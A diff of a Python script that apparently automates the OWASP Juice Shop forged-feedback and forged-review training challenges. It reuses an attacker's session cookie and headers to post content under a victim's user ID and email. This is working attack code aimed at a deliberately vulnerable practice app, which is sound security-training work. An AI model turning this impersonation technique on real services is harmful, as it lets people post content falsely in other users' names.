@@ -1,5 +1,4 @@
 """
-This is OLD VERSION --------------------------
 This file is to automate the OWASP JUICESHOP TASK
 FORGED FEEDBACK
 FORGED REVIEW
@@ -7,7 +6,6 @@ The basic idea behind is to give a feedback/review in the name of other people
 We will use user A's header and cookie to send post with username B
 """
 
-from plugins import login as usrLogin
 from plugins import attack as a
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -16,15 +14,20 @@ class forged(a.attack_inter):
 
     def __init__(self):
         self.juice_session = a.requests.session()
-        usr = usrLogin.login()
-        response, self.cookie, self.header = usr.run()
-        self.userid = usr.id
-        self.author = usr.email
+        self.set_info()
+        self.comment = 'I like orange Juice'
+        self.rating = 5
+
+    def set_info(self):
+        print("please enter attacker's email")
+        self.email = input()
+        print("please enter victim's email")
+        self.victim_email = input()
+        self.userid = a.get_userId(self.email)
+        self.forgeId = a.get_userId(self.victim_email)
+        self.cookie, self.header = a.get_auth(self.email)
+        self.author = self.victim_email
         self.captchaId, self.captcha, self.captchaAns = self.load_captcha()
-        if self.userid > 1:
-            self.forgeId = 1 # you can also use any other user
-        else:
-            self.forgeId = None
 
     def generator(self):
         pass
@@ -44,21 +47,23 @@ class forged(a.attack_inter):
             'UserId': self.forgeId,
             'captchaId': self.captchaId,
             'captcha': self.captchaAns,
-            'comment': 'I like orange Juice',
-            'rating': 5,
+            'comment': self.comment,
+            'rating': self.rating,
         }
         response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json=json_data)
         print(response.text)
         if response.status_code == 201:
             print("The original user has id")
             print(self.userid)
+            print("The forged user has id")
+            print(self.forgeId)
             print(response.json()["data"])
         print(response.status_code)
 
     def forged_review(self):
         print("------------------------------------------")
         print("Let us forge other's review --------------")
-        url = a.URL + '/rest/products/1/reviews'
+        url = a.URL + '/rest/products/{}/reviews'.format(self.forgeId)
         json_data = {
             'message': 'I like orange Juice',
             'author': self.author,
@@ -67,16 +72,8 @@ class forged(a.attack_inter):
         print(response.text)
 
     def run(self):
-        a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
-                            level=a.logging.INFO, format='%(asctime)s %(message)s')
-        logger = a.logging.getLogger("Forged feedback and review")
-        a.logging.info(logger)
-        a.logging.info('Started')
         self.forged_feedback()
         self.forged_review()
-        a.logging.info('Finished')
-
-
 
 
 
